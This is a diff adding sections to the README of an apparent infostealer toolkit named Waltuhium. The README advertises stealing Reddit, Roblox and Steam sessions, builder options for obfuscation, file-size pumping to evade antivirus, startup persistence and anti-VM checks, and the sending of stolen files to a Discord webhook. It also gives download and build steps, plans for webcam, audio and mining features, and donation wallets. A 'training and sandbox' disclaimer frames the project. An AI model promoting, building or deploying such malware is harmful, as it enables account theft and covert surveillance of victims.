@@ -57,3 +57,55 @@
   <li>:speech_balloon: <strong>Reddit Session Stealer & Validator</strong> - Steals and validate Reddit sessions.</li>
   <li>:video_game: <strong>Roblox Session Stealer & Validator</strong> - Steals and validate Roblox sessions.</li>
   <li>:video_game: <strong>Steam Session Stealer & Validator</strong> - Steals and validate Steam sessions.</li>
+
+
+<!-- Builder Settings Section -->
+<h2 id="builder-settings">Builder Settings 🔧</h2>
+<p>Waltuhium builder provides the following options:</p>
+<ul>
+  <li>:twisted_rightwards_arrows: <strong>Realtime Obfuscation</strong> - Applies real-time obfuscation techniques.</li>
+  <li>:floppy_disk: <strong>File Pumper</strong> (Optional) - Pump your file size to evade detection.</li>
+  <li>:rocket: <strong>Startup Methods</strong> (Optional) - Use from schtask or regedit or folder startup options for startup.</li>
+  <li>:art: <strong>Icon Changer</strong> (Optional) - Changes the program icon (must end in .ico).</li>
+  <li>:no_entry_sign: <strong>Anti-VM</strong> (Optional) - It uses 12 different Anti-VM methods for enhanced security.</li>
+</ul>
+
+<!-- How to Build Section -->
+<h2 id="how-to-build">How to Build 🛠️</h2>
+<p>To set up Waltuhium, follow these steps:</p>
+<ol>
+  <li>:arrow_down: Download and Install <a href="https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe">Python 3.11.0</a></li>
+  <li>:arrow_down: <a href="https://github.com/waltuhium23/waltuhium/archive/refs/heads/main.zip">Download Waltuhium</a></li>
+  <li>:arrow_down: <a href="https://www.pcworld.com/article/394871/how-to-unzip-files-in-windows-10.html#:~:text=Unzip%20all%20files%20in%20a%20ZIP%20file">Extract</a> the zip file.</li>
+  <li>:point_right: Navigate to the Waltuhium folder and double click <code>build.bat</code>.</li>
+  <li>:rocket: Follow the on-screen instructions to complete the setup.</li>
+</ol>
+<!-- Todo Section -->
+<h2 id="todo">Todo 📝</h2>
+<p>- Yandex Stealer<br>- Take Webcamshot<br>- Record Audio<br>- Mining<br>- Youtube Session stealer & validator</p>
+
+<!-- Additional Section -->
+<h2 id="additional">Additional ℹ️</h2>
+<p>- Sends all files to your Discord webhook in beautiful embeds and a structured zip file<br>- Anti-Debug</p>
+
+<!-- Disclaimer Section -->
+<h2 id="disclaimer">Disclaimer ⚠️</h2>
+<p>- This software was developed for personal training and sandbox testing. The developer of the software is not responsible in any way for its misuse. By downloading or using this program, you acknowledge that you are solely responsible for any consequences that may result from the use of this program.</p>
+
+<!-- Notes Section -->
+<h2 id="notes">Note's 📢</h2>
+<p>- If you have any issues or need support with this project, you can contact me via <a href="https://t.me/waltuhxd">Telegram</a>:speech_balloon:</p>
+
+<!-- Support the Project Section -->
+<h2 id="support-the-project">Support the Project</h2>
+<p>If you find this project useful and would like to show your support, you can make a donation using the following cryptocurrencies:</p>
+<ul>
+  <li><strong>Bitcoin (BTC):</strong> Wallet Address: bc1qrqr78ay3zcgtegt0kujc90er47sd3atu62te8x</li>
+  <li><strong>Ethereum (ETH Exodus):</strong> Wallet Address: 0xccfD8B45c22BFfEda346aD30FCb7907A0CB03c99</li>
+ <li><strong>Ethereum (ETH MetaMask):</strong> Wallet Address: 0x4a3C6a069D2F4EE9A21255cc4a916ABAdDde9d3D</li>
+  <li><strong>Litecoin (LTC):</strong> Wallet Address: LKtzewf1txqa5G6uGoKesWvyZeradLAvKH</li>
+</ul>
+
+<!-- Screenshots Section -->
+<h2 id="screenshots">Screenshots 📸</h2>
+<img src="https://media.discordapp.net/attachments/1214378635189030924/1214627992354160680/image.png?ex=65f9cd78&is=65e75878&hm=eab123c871e0f4e80938898ef635065ec55643148ef7e415281692e6e9e7cc59&=&format=webp&quality=lossless&width=411&height=675" alt="Application Screenshot">
